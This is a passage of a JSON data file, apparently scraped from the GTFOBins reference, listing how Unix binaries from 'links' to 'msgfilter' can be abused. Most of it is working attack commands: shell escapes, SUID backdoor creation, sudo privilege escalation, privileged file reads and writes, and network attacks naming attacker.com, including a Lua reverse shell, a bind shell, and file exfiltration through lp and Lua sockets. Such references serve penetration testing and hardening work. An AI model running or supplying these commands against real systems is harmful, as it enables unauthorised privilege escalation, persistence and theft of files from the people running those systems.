                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which links) .\n\nLFILE=file_to_read\n./links \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo links \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "loginctl",
        "url": "https://gtfobins.github.io/gtfobins/loginctl/",
        "functions": [
            {
                "function": "Info",
                "description": "This invokes the default pager, which is likely to be less, other functions may apply.\nThis might not work if run by unprivileged users depending on the system configuration."
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "loginctl user-status\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo loginctl user-status\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "logsave",
        "url": "https://gtfobins.github.io/gtfobins/logsave/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "logsave /dev/null /bin/sh -i"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which logsave) .\n\n./logsave /dev/null /bin/sh -i -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo logsave /dev/null /bin/sh -i"
                    }
                ]
            }
        ]
    },
    {
        "name": "look",
        "url": "https://gtfobins.github.io/gtfobins/look/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nlook '' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which look) .\n\nLFILE=file_to_read\n./look '' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo look '' \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "lp",
        "url": "https://gtfobins.github.io/gtfobins/lp/",
        "functions": [
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "To collect the file run the following on the attacker box (this requires cups to be installed):\n\n\t1. padmin -p printer -v socket://localhost -E to create a virtual printer;\n\t2. lpadmin -d printer to set the new printer as default;\n\t3. cupsctl --remote-any to enable printing from the Internet;\n\t4. nc -lkp 9100 to receive the file.\n\nSend a local file to a CUPS server.",
                        "code": "LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST"
                    }
                ]
            }
        ]
    },
    {
        "name": "ltrace",
        "url": "https://gtfobins.github.io/gtfobins/ltrace/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ltrace -b -L /bin/sh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of ltrace -F DATA.",
                        "code": "LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.",
                        "code": "LFILE=file_to_read\nltrace -F $LFILE /dev/null"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ltrace -b -L /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "lua",
        "url": "https://gtfobins.github.io/gtfobins/lua/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "lua -e 'os.execute(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This requires lua-socket installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This requires lua-socket installed.",
                        "code": "export LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires lua-socket installed.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires lua-socket installed.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which lua) .\n\nlua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo lua -e 'os.execute(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which lua) .\n\n./lua -e 'os.execute(\"/bin/sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "lualatex",
        "url": "https://gtfobins.github.io/gtfobins/lualatex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which lualatex) .\n\n./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "luatex",
        "url": "https://gtfobins.github.io/gtfobins/luatex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which luatex) .\n\n./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
                    }
                ]
            }
        ]
    },
    {
        "name": "lwp-request",
        "url": "https://gtfobins.github.io/gtfobins/lwp-request/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nlwp-request \"file://$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "mail",
        "url": "https://gtfobins.github.io/gtfobins/mail/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "GNU version only.",
                        "code": "mail --exec='!/bin/sh'"
                    },
                    {
                        "description": "This creates a valid Mbox file which may be required by the binary.",
                        "code": "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "GNU version only.",
                        "code": "sudo mail --exec='!/bin/sh'"
                    }
                ]
            }
        ]
    },
    {
        "name": "lwp-download",
        "url": "https://gtfobins.github.io/gtfobins/lwp-download/",
        "functions": [
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file path must be absolute.",
                        "code": "LFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "man",
        "url": "https://gtfobins.github.io/gtfobins/man/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "man man\n!/bin/sh"
                    },
                    {
                        "description": "This only works for GNU man and requires GNU troff (groff to be installed).",
                        "code": "man '-H/bin/sh #' man"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "man file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo man man\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "make",
        "url": "https://gtfobins.github.io/gtfobins/make/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\""
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Requires a newer GNU make version.",
                        "code": "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" ."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which make) .\n\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='/bin/sh'\\nsudo make -s --eval=$'x:\\\\n\\\\t-'\"$COMMAND\""
                    }
                ]
            }
        ]
    },
    {
        "name": "mawk",
        "url": "https://gtfobins.github.io/gtfobins/mawk/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "mawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which mawk) .\n\nLFILE=file_to_read\n./mawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which mawk) .\n\n./mawk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "minicom",
        "url": "https://gtfobins.github.io/gtfobins/minicom/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "Start the following command to open the TUI interface, then:\n\n\t1. press Ctrl-A o and select Filenames and paths;\n\t2. press e, type /bin/sh, then Enter;\n\t3. Press Esc twice;\n\t4. Press Ctrl-A k to drop the shell. After the shell, exit with Ctrl-A x.\n",
                        "code": "minicom -D /dev/null"
                    },
                    {
                        "description": "After the shell, exit with Ctrl-A x.",
                        "code": "TF=$(mktemp)\necho \"! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)\" >$TF\nminicom -D /dev/null -S $TF\nreset^J"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Start the following command to open the TUI interface, then:\n\n\t1. press Ctrl-A o and select Filenames and paths;\n\t2. press e, type /bin/sh, then Enter;\n\t3. Press Esc twice;\n\t4. Press Ctrl-A k to drop the shell. After the shell, exit with Ctrl-A x.\n",
                        "code": "sudo install -m =xs $(which minicom) .\n\n./minicom -D /dev/null"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Start the following command to open the TUI interface, then:\n\n\t1. press Ctrl-A o and select Filenames and paths;\n\t2. press e, type /bin/sh, then Enter;\n\t3. Press Esc twice;\n\t4. Press Ctrl-A k to drop the shell. After the shell, exit with Ctrl-A x.\n",
                        "code": "sudo minicom -D /dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "more",
        "url": "https://gtfobins.github.io/gtfobins/more/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TERM= more /etc/profile\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "more file_to_read"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which more) .\n\n./more file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TERM= sudo more /etc/profile\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "mosquitto",
        "url": "https://gtfobins.github.io/gtfobins/mosquitto/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmosquitto -c \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which mosquitto) .\n\nLFILE=file_to_read\n./mosquitto -c \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "msfconsole",
        "url": "https://gtfobins.github.io/gtfobins/msfconsole/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")"
                    }
                ]
            }
        ]
    },
    {
        "name": "mount",
        "url": "https://gtfobins.github.io/gtfobins/mount/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Exploit the fact that mount can be executed via sudo to replace the mount binary with a shell.",
                        "code": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount"
                    }
                ]
            }
        ]
    },
    {
        "name": "msgattrib",
        "url": "https://gtfobins.github.io/gtfobins/msgattrib/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmsgattrib -P $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which msgattrib) .\n\nLFILE=file_to_read\n./msgattrib -P $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo msgattrib -P $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "msgcat",
        "url": "https://gtfobins.github.io/gtfobins/msgcat/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmsgcat -P $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which msgcat) .\n\nLFILE=file_to_read\n./msgcat -P $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo msgcat -P $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "msgconv",
        "url": "https://gtfobins.github.io/gtfobins/msgconv/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nmsgconv -P $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which msgconv) .\n\nLFILE=file_to_read\n./msgconv -P $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo msgconv -P $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "msgfilter",
        "url": "https://gtfobins.github.io/gtfobins/msgfilter/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "Any text file will do as the input (use -i). kill is needed to spawn the shell only once.",
                        "code": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data. /bin/cat can be replaced with any other filter program.",
                        "code": "LFILE=file_to_read\nmsgfilter -P -i \"LFILE\" /bin/cat"
                    }
                ]
            },
            {
                "function": "SUID",
